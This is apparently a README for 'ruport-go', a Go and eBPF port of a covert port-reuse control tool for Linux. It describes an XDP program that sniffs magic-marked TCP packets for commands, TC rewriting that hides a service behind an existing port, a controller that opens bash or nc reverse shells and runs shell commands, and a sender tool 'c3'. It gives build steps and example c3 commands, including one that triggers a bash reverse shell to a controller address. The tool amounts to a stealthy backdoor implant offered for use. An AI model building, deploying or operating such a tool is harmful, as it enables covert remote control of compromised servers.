# ruport-go

基于 Golang + [cilium/ebpf](https://github.com/cilium/ebpf) 实现的端口复用控制程序，
是 [ruport](../ruport)（C + libbpf）的功能等价移植。

仅支持 Linux（Debian/Ubuntu 系发行版）。**不要在 Windows 下编译**，构建与测试需在
Linux 上执行 `make`。

## 功能

与原 ruport 项目一致：

- **XDP 程序**（SKB 模式，`XDP_PASS` 不影响正常业务）：解析网卡上的 IPv4/TCP 包，
  识别 TCP payload 前 12 字节魔术标记（`s1² + s2² = s3`，小端），命中后解析 124
  字节指令消息（`ins/cip/cport/connport/nativeport/ext[100]`），以
  `(cip<<16)+cport` 为 key 存入 `message_map`；
- **TC 程序**（clsact，ingress + egress）：维护 `router_map`，入站命中路由时把
  目的端口改写为本地真实服务端口 `nativeport`（并更新校验和），出站命中时把源端口
  改写回出网端口 `connport`，实现端口复用；
- **控制程序 ruport**：每秒轮询 `message_map`，按指令添加/删除路由，执行反弹
  连接（bash / nc）、执行 shell 命令等功能；
- **指令发送端 c3**：构造同样的 124 字节魔术包发到被控端开放端口，
  命令行参数与原 `insTool/c3.py` 完全一致。

与原项目的差异（仅技术栈层面，不改功能语义）：

- 用户态由 C/libbpf 换成 Go + cilium/ebpf，skeleton 换成 bpf2go 生成的绑定；
- 经典 TC clsact 的挂载 cilium/ebpf 不直接提供，使用 vishvananda/netlink 创建
  qdisc/filter（等价于原 `bpf_tc_hook_create`/`bpf_tc_attach`，priority=1 handle=1）；
- pidhide（进程隐藏）在原项目 main() 中已注释禁用，本项目不移植；
  `-H` 参数仅为命令行兼容保留，无实际作用；
- `-p` 参数与原版一致：解析并校验，但不参与后续逻辑。

## 目录结构

```
bpf/                  eBPF C 源码（由 bpf2go 编译）
  common.h            Message/Router 结构与常量（对应原 types.h）
  ruport_xdp.bpf.c    XDP 指令嗅探（对应原 ruport.xdp.c）
  ruport_tc.bpf.c     TC 端口复用改写（对应原 ruport.tc.c）
internal/bpf/         bpf2go 生成的 Go 绑定（make generate 产生）+ 加载封装
internal/control/     指令处理（路由增删、反弹、shell 执行，对应原 ruport.c 逻辑）
cmd/ruport/           控制主程序
cmd/c3/               指令发送端（对应原 insTool/c3.py）
```

## 环境与编译

Ubuntu 24.04（已在原项目验证过的发行版）：

```bash
sudo apt install golang-go clang libbpf-dev make
```

（Go 版本需 >= 1.24，若仓库版本过旧请自行安装新版）

编译：

```bash
make
```

`make` 自动完成：`go mod tidy` -> `bpf2go` 编译 `bpf/*.bpf.c` 并在
`internal/bpf/` 下生成 Go 绑定 -> `go build` 产出 `ruport` 与 `c3`。

清理：

```bash
make clean
```

## 运行

```bash
sudo ./ruport -i eth0
```

- `-i` —— 网络接口名称。不指定时自动读取 `/proc/net/dev`，选择发送字节数最多的
  非 `lo` 网卡（与原版一致，可能获取不到，建议显式指定）；
- `-p` —— 端口（解析校验，不参与逻辑，兼容保留）；
- `-H` —— 兼容保留，无实际作用（原版 pidhide 已禁用）。

程序收到 SIGINT 时卸载 XDP 与 TC 挂载后退出。

指令发送（用法与原 c3.py 一致，`./c3 -h` 查看完整帮助）：

```bash
# 添加路由：目标 192.168.1.2:80，控制端 192.168.1.3:3333，出网端口 80，功能端口 22
./c3 -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 3333 -x 80 -y 22

# bash 反弹
./c3 -t 192.168.1.2 -p 80 -2 -S 192.168.1.3 -P 2222 -x 80 -e bash

# 删除路由
./c3 -t 192.168.1.2 -p 80 -d -1 -S 192.168.1.3 -P 3333 -x 80
```

nc 反弹要求被控端程序同目录下存在 `nc` 可执行文件（与原版一致）。
